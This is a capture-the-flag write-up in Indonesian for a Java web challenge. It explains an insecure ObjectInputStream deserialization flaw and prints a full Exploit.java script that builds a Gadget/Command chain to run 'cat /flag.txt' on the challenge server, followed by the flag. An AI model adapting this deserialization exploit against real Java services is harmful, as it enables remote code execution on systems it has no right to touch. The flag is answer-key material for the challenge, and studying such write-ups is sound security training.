# EZZ Momento

{% hint style="info" %}
Category: Web

Difficulty: medium
{% endhint %}

## Deskripsi

> java is ezz... zzz...
>
> but wait! whattt.......!?
>
> http://ctf.slashrootctf.id:30013 Diberikan source code: [dist.zip](https://ctf.slashrootctf.id/files/fdeb42f3b7de5cf8403484c1f3f44897/dist.zip?token=eyJ1c2VyX2lkIjoxNiwidGVhbV9pZCI6MzIsImZpbGVfaWQiOjE4fQ.ZvgxlQ.XJEWvmTXp41Ji30feQJFC-cYZHE)

## Langkah Penyelesaian

* Kali tidak black box testing, tapi lumayan sulit bagi yang belum pernah belajar Java.
* Jujur aja saya banyak dibantu oleh AI. Kerentanan utamanya ada pada penggunaan `ObjectInputStream` dalam class `MyHandler`.

{% code lineNumbers="true" %}
```java
try (ObjectInputStream objectInputStream = new ObjectInputStream(exchange.getRequestBody())) {
    String response = "";
    try {
        response = objectInputStream.readObject().toString();
    } catch (ClassNotFoundException | IOException e) {
        e.printStackTrace();
        response = e.toString();
    }
    // ...
}
```
{% endcode %}

* Hal tersebut bisa menyebabkan RCE karena server langsung menerima objek yang diserialkan tanpa memvalidasinya terlebih dulu.
* Ditambah lagi ada class `Gadget` dan `Command` yang dapat membuat proses eksploitasi lebih mudah. Di mana class `Command` memungkinkan eksekusi perintah sistem secara langsung. Dan class `Gadget` akan memanggil method `run()` dari `Command` saat \`toString()\`\` dipanggil.
* Kemudian saya diberikan script `Exploit.java` menggunakan **Reflection** oleh AI untuk mencoba RCE. Setelah beberapa kali penyesuaian karena issue package-package di Java akhirnya bisa juga :)
* Berikut ini adalah exploit scriptnya:

{% code lineNumbers="true" %}
```java
// Script ini terletak di `src/main/java`

import com.dimas.Command;
import com.dimas.Gadget;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class Exploit {
    public static void main(String[] args) throws Exception {
        // Buat objek Command menggunakan konstruktor tanpa argumen
        Command cmd = new Command();
        
        // Gunakan refleksi untuk mengakses dan mengubah field 'command'
        Field commandField = Command.class.getDeclaredField("command");
        commandField.setAccessible(true);
        commandField.set(cmd, "cat /flag.txt");
        
        // Bungkus Command dalam Gadget
        Gadget gadget = new Gadget(cmd);
        
        // Serialisasi objek Gadget
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(gadget);
        oos.close();
        
        // Encode payload ke Base64
        String payload = Base64.getEncoder().encodeToString(baos.toByteArray());
        
        // Kirim payload ke server
        URL url = new URL("http://ctf.slashrootctf.id:30013");
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("POST");
        con.setDoOutput(true);
        con.getOutputStream().write(Base64.getDecoder().decode(payload));
        
        // Baca respons dari server
        java.util.Scanner s = new java.util.Scanner(con.getInputStream()).useDelimiter("\\A");
        String response = s.hasNext() ? s.next() : "";
        System.out.println("Server response: " + response);
    }
}
```
{% endcode %}

* Alhamdulillah, berhasil solve semua soal web exploit :))

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Flag

<kbd>slashroot8{it\_is\_really\_private\_UwU}</kbd>
